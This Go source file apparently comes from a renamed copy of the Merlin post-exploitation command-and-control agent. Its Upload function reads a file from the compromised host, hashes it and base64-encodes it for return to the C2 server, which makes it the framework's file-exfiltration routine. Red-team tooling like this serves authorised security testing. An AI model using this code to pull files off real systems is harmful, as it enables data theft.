// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"crypto/sha1"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"

	// Merlin Main
	"github.com/testtoto1337/merzhin/pkg/jobs"

	// Internal
	"github.com/testtoto1337/merzhin-agent/cli"
)

// Upload receives a job from the server to upload a file from the host to the Merlin server
func Upload(transfer jobs.FileTransfer) (jobs.FileTransfer, error) {
	cli.Message(cli.DEBUG, "Entering into commands.Upload() function")
	// Agent will be uploading a file to the server
	cli.Message(cli.NOTE, "FileTransfer type: Upload")

	// Setup OS environment, if any
	err := Setup()
	if err != nil {
		return jobs.FileTransfer{}, err
	}
	defer TearDown()

	fileData, fileDataErr := ioutil.ReadFile(transfer.FileLocation)
	if fileDataErr != nil {
		cli.Message(cli.WARN, fmt.Sprintf("There was an error reading %s", transfer.FileLocation))
		cli.Message(cli.WARN, fileDataErr.Error())
		return jobs.FileTransfer{}, fmt.Errorf("there was an error reading %s:\r\n%s", transfer.FileLocation, fileDataErr.Error())
	}

	fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
	_, errW := io.WriteString(fileHash, string(fileData))
	if errW != nil {
		cli.Message(cli.WARN, fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
		transfer.FileLocation,
		len(fileData),
		fileHash.Sum(nil)))

	ft := jobs.FileTransfer{
		FileLocation: transfer.FileLocation,
		FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
		IsDownload:   true,
	}
	return ft, nil
}
